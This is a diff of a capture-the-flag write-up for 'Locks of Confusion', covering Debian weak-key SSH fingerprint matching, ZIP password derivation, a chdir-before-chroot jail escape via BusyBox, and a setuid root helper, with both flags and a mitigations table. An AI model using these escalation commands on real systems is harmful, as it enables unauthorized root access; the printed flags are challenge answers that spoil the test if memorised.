@@ -14,81 +14,51 @@ tags:
   - Privilege Escalation
 ---
 
-# KPMG CTF 2026 — Locks of Confusion
+# KPMG CTF 2026 - Locks of Confusion
 
 ---
 
 ## Challenge Description
 
-> An Internal Ops portal surfaces inventory, tickets, DNS, and documentation for a fleet of servers. One of them is a Debian 4.0 legacy database replica from 2007 whose SSH keypair was never rotated. Find the key, unlock the backup, and escalate to root.
-
-**Flags:** Two — account-data backup (user) and root shell.
+> An Internal Ops portal with inventory, tickets, DNS, and documentation. One of the servers is a Debian 4.0 legacy database replica from 2007 whose SSH keypair was never rotated. Find the key, unlock the backup, and escalate to root.
 
 ---
 
-## Step 1 — Reconnaissance
+## Step 1 - Recon
 
-The Internal Ops dashboard linked to several useful pages:
+The dashboard had several useful pages. The inventory page told us `legacy-03` was a Debian 4.0 (Etch) machine deployed in 2007, still running OpenSSL `0.9.8c-4` and OpenSSH `4.3p2-9`. That OpenSSL version is notable - it predates the Debian weak-key bug fix (CVE-2008-0166), which means any RSA keys generated on it came from a drastically reduced keyspace.
 
-| Endpoint | What it revealed |
-|---|---|
-| `/inventory` | `legacy-03` — Debian 4.0 (Etch), deployed 2007-11-14, running OpenSSL `0.9.8c-4` and OpenSSH `4.3p2-9` |
-| `/tickets` | Ticket `TICK-4471` — SSH access issue for `svc-legacydb` after 2011 P2V migration |
-| `/wiki/notes` | Confirmed SSH host keys and the `svc-legacydb` keypair were generated in 2007 and carried over without regeneration |
-
-Ticket `TICK-4471`'s HTML source contained two hidden archive paths in comments:
+The tickets page had an entry about an SSH access issue for `svc-legacydb` after a 2011 migration. Looking at the HTML source of the ticket, there were two archive paths left in comments:
 
 ```plain
 /archive/provisioning/legacy-03-2007.tar.gz
 /archive/keyspace/legacy-keys-2007.tar.gz
 ```
 
-![Archive paths discovered in ticket HTML](/img/posts/kpmg-ctf-2026-12_loc_archive_paths.webp)
+![Archive paths in ticket HTML](/img/posts/kpmg-ctf-2026-12_loc_archive_paths.webp)
 
-Requests to those paths redirected to `/verify` — a node-selection image challenge. Completing it in the browser unlocked the downloads for that session.
+Hitting those paths redirected to `/verify`, a node-selection image challenge. After completing that in the browser the downloads worked in the same session.
 
 ---
 
-## Step 2 — Extracting the Archives
+## Step 2 - Extracting the Archives
 
 ```bash
-# After passing the /verify image challenge in-browser:
-wget --load-cookies cookies.txt \
-  http://<host>/archive/provisioning/legacy-03-2007.tar.gz \
-  http://<host>/archive/keyspace/legacy-keys-2007.tar.gz
-
 tar -xzf legacy-03-2007.tar.gz
 tar -xzf legacy-keys-2007.tar.gz
 ```
 
-**Provisioning archive contents:**
+The provisioning archive had the deployed `authorized_keys` file and a `provision.log` confirming an unencrypted 2048-bit RSA key was generated for `svc-legacydb` back in 2007. The keyspace archive had 300 candidate PEM private keys.
 
-```plain
-legacy-03-2007/
-  home/svc-legacydb/.ssh/authorized_keys   ← the deployed public key
-  var/log/provision.log                     ← confirms unencrypted 2048-bit RSA key, generated 2007
-  etc/ssh/sshd_config.fragment
-  etc/motd
-  README-RESTORE.txt
-```
+The `README.txt` in the keyspace archive (a note from M. Reyes in infra) also pointed to a password-protected backup ZIP at `/archive/backups/e6f25638ae2ed6ba955cdae6a74c6798.zip` and explained how the password was derived from the matching key.
 
-**Keyspace archive:** 300 candidate PEM private keys (`privkey_0000.pem` …… `privkey_0299.pem`).
-
-![Finding the private key match](/img/posts/kpmg-ctf-2026-11_loc_found_privkey.webp)
-
-The `README.txt` inside the keyspace archive (note from M. Reyes, infra) also pointed to a password-protected backup ZIP:
-
-```plain
-/archive/backups/e6f25638ae2ed6ba955cdae6a74c6798.zip
-```
-
-![Key and path information from README](/img/posts/kpmg-ctf-2026-13_loc_keys_path.webp)
+![Key and path info from README](/img/posts/kpmg-ctf-2026-13_loc_keys_path.webp)
 
 ---
 
-## Step 3 — Finding the Matching Private Key
+## Step 3 - Finding the Matching Key
 
-I fingerprinted the `authorized_keys` entry and compared it against every candidate:
+We fingerprinted the `authorized_keys` entry and compared it against each candidate:
 
 ```bash
 target=$(ssh-keygen -lf legacy-03-2007/home/svc-legacydb/.ssh/authorized_keys | awk '{print $2}')
@@ -99,16 +69,17 @@ for key in legacy-keys-2007/privkey_*.pem; do
 done
 ```
 
-**Result:** `privkey_0137.pem`
+Match: `privkey_0137.pem`
 
-> [!NOTE]
-> The 2007 OpenSSL version (`0.9.8c`) was affected by the Debian weak-key vulnerability (CVE-2008-0166), which drastically reduced the RSA keyspace — this is why only 300 candidates were needed.
+![Found the matching private key](/img/posts/kpmg-ctf-2026-11_loc_found_privkey.webp)
+
+Only 300 candidates were needed because the 2007 Debian OpenSSL bug made the RSA keyspace tiny.
 
 ---
 
-## Step 4 — Unlocking the Backup ZIP (Part 1 Flag)
+## Step 4 - Unlocking the Backup ZIP (Flag 1)
 
-Per the README, the ZIP password is the **first 64 characters of the base64 body** of the matching PEM (headers, footers, and line breaks stripped):
+The README said the ZIP password is the first 64 characters of the base64 body of the matching PEM file, with headers, footers, and line breaks stripped:
 
 ```bash
 password=$(grep -v '^-----' legacy-keys-2007/privkey_0137.pem | tr -d '\n' | cut -c1-64)
@@ -117,125 +88,84 @@ unzip -P "$password" e6f25638ae2ed6ba955cdae6a74c6798.zip
 
 ![ZIP password derivation](/img/posts/kpmg-ctf-2026-14_loc_zip_password.webp)
 
-The ZIP contained `user.txt` with the first flag.
+The ZIP contained `user.txt` with the flag.
 
 ![Part 1 flag](/img/posts/kpmg-ctf-2026-10_loc_flag_part1.webp)
 
 ### Flag 1
 
-```text
+```plain
 KPMG_CTF{QkZ-FGqQZ9zMq1Z_jJ3RiuNp8ZfyNJebZTZ_U385U7UP}
 ```
 
 ---
 
-## Step 5 — SSH Login to the Live Host (Part 2)
-
-**Target:** `nc 0.cloud.chals.io 26107`
-
-Using `privkey_0137.pem` to authenticate as `svc-legacydb`:
+## Step 5 - SSH Login to the Live Host (Part 2)
 
 ```sh
 ssh -tt -p 26107 \
-  -i /path/to/privkey_0137.pem \
+  -i privkey_0137.pem \
   -o IdentitiesOnly=yes \
   svc-legacydb@0.cloud.chals.io
 ```
 
-The login succeeded but dropped into a restricted **BusyBox shell**. The `PATH` was `/nonexistent`, so standard commands weren't found. BusyBox itself was reachable at its full path:
+Login worked but dropped us into a restricted BusyBox shell. `PATH` was set to `/nonexistent` so normal commands weren't found. We used BusyBox directly:
 
 ```sh
 /bin/busybox id    # uid=1500
 /bin/busybox ls
 ```
 
-The shell also printed `sh: getcwd: No such file or directory` — a strong hint that the working directory was **outside the visible filesystem**.
+The shell also printed `sh: getcwd: No such file or directory` on every command. That error was the first clue that something was off about where the shell thought it was.
 
-![SSH config observed](/img/posts/kpmg-ctf-2026-15_loc2_ssh_config.webp)
-
----
-
-## Step 6 — Mapping the Jail
-
-The `jail_shell` binary (inspected via SFTP) performed this sequence on login:
-
-```text
-chdir("/opt/diagnostics/landing")   ← moves CWD outside the future jail
-chroot("/opt/jail")                 ← jails the filesystem root
-drop to UID/GID 1500
-exec /bin/sh
-```
-
-Because the shell changed directory **before** the `chroot`, the working directory still pointed to a real path on the host filesystem — outside `/opt/jail`. The shell could not resolve it, producing the `getcwd` error, but relative paths like `../../../` still traversed the host filesystem.
-
-```sh
-/bin/busybox ls ..
-/bin/busybox ls ../..
-/bin/busybox ls ../../..   # shows real container root: etc, home, opt, root, usr
-```
-
-> [!IMPORTANT]
-> Running `cd /` at this point would move the shell into the jail and lose the outside-jail working directory. All traversal must happen before any `cd /`.
+![SSH config check](/img/posts/kpmg-ctf-2026-15_loc2_ssh_config.webp)
 
 ---
 
-## Step 7 — SFTP Recon and Setuid Binary
+## Step 6 - Understanding the Jail Setup
 
-I used SFTP on the same port to inspect the real filesystem:
+We used SFTP on the same port to inspect the filesystem and downloaded two SUID binaries from `/usr/local/bin`:
 
 ```sh
-sftp -P 26107 \
-  -i /path/to/privkey_0137.pem \
-  -o IdentitiesOnly=yes \
-  svc-legacydb@0.cloud.chals.io
+sftp -P 26107 -i privkey_0137.pem -o IdentitiesOnly=yes svc-legacydb@0.cloud.chals.io
 ```
 
-```text
-sftp> ls -la /usr/local/bin
-```
+| Binary | What it does |
+|---|---|
+| `jail_shell` | Does `chdir("/opt/diagnostics/landing")`, then `chroot("/opt/jail")`, drops to UID 1500, starts `/bin/sh` |
+| `diag-recovery` | Calls `setgid(0)`, `setuid(0)`, then starts `/bin/sh` - effectively a root shell |
 
-Two SUID binaries appeared:
-
-| Binary | Owner | Permissions | Purpose |
-|---|---|---|---|
-| `jail_shell` | root | `-rws--x--x` | Sets up the chroot jail on login |
-| `diag-recovery` | root | `-rws--x--x` | Calls `setgid(0)`, `setuid(0)`, then `/bin/sh` |
-
-`diag-recovery` was a **root shell launcher** — setuid root with no further checks.
+That explained everything. The login binary changes directory **before** calling `chroot`. After the chroot, the shell's working directory is still pointing to the pre-jail path on the real filesystem. The shell can't resolve it (hence `getcwd` error), but relative paths like `../../../` still traverse the real filesystem.
 
 ![SSH allows password auth](/img/posts/kpmg-ctf-2026-16_loc2_ssh_allows_password.webp)
 ![Passwd folder recon](/img/posts/kpmg-ctf-2026-17_loc2_passwd_folder.webp)
 
+> [!IMPORTANT]
+> You have to do the traversal before running `cd /`. Doing `cd /` would move the shell into the jail and lose that outside-jail starting point.
+
 ---
 
-## Step 8 — Chroot Escape and Root Shell
+## Step 7 - Escaping and Getting Root
 
-From a **fresh SSH login** (before any `cd`), the working directory was still outside the jail. BusyBox retained `CAP_SYS_CHROOT`, so it could call `chroot` again:
+From a fresh SSH login, before doing anything else:
 
 ```sh
 /bin/busybox chroot ../../../ /bin/sh
 ```
 
-`../../../` resolved to the container's real root. This new shell was **unjailed** while still running as `svc-legacydb`. From there, running the setuid helper:
+`../../../` walks back to the container's real root. We're out of the jail, still as `svc-legacydb`. Now we run the setuid helper:
 
 ```sh
 /usr/local/bin/diag-recovery
 /bin/id
-```
+# uid=0(root)
 
-```text
-uid=0(root) gid=0(root) groups=0(root),1000(svc-legacydb)
-```
-
-Reading the root flag:
-
-```sh
 /bin/cat /root/root.txt
 ```
 
-### Flag 2 (Root)
+### Flag 2
 
-```text
+```plain
 KPMG_CTF{71INJZCHUi1zpL1dggZenlcyMHs6qh-NtW7ntKiKLBpo}
 ```
 
@@ -243,16 +173,15 @@ KPMG_CTF{71INJZCHUi1zpL1dggZenlcyMHs6qh-NtW7ntKiKLBpo}
 
 ## Mitigations
 
-| Vulnerability | Recommended Fix |
+| Vulnerability | Fix |
 |---|---|
-| Unrotated 2007 SSH keys (Debian weak-key bug) | Regenerate all keypairs; enforce key rotation policy |
-| Archive paths exposed in HTML comments | Purge debug/staging comments before production deployment |
-| Chroot escape via pre-chroot `chdir` | Use `pivot_root` or namespaces instead of `chroot` for sandboxing |
-| Unrestricted SUID root helper (`diag-recovery`) | Remove or replace with a capability-based alternative; audit all SUID binaries |
-| BusyBox retaining `CAP_SYS_CHROOT` | Drop all unnecessary capabilities before dropping privileges |
+| Unrotated 2007 SSH keys | Regenerate all keypairs, enforce rotation policy |
+| Archive paths in HTML comments | Strip debug artifacts before production |
+| chroot escape via pre-chroot chdir | Use `pivot_root` or namespaces instead of `chroot` |
+| Unrestricted SUID root helper | Audit and remove unnecessary SUID binaries |
 
 ---
 
 ## Summary
 
-Locks of Confusion chained two phases across a legacy infrastructure story. Part 1 exploited the historically weak Debian OpenSSL RNG (CVE-2008-0166) — the 2007-era SSH keypair had an astronomically reduced keyspace, making brute-force fingerprint matching feasible across 300 candidates. Part 2 used the classic `chdir`-before-`chroot` escape: the login shell placed the working directory outside the jail, and BusyBox's retained `CAP_SYS_CHROOT` allowed a second `chroot` call to escape back to the real filesystem, after which a root-owned SUID helper finished the escalation.
+Part 1 used the Debian weak-key bug - keys generated in 2007 on that OpenSSL version came from a small enough keyspace that brute-forcing fingerprint matches across 300 candidates was trivial. Part 2 was a classic chroot escape: the login shell set the working directory outside the jail before calling chroot, so relative paths still reached the real filesystem. A root-owned SUID helper sitting on that same filesystem finished the job.
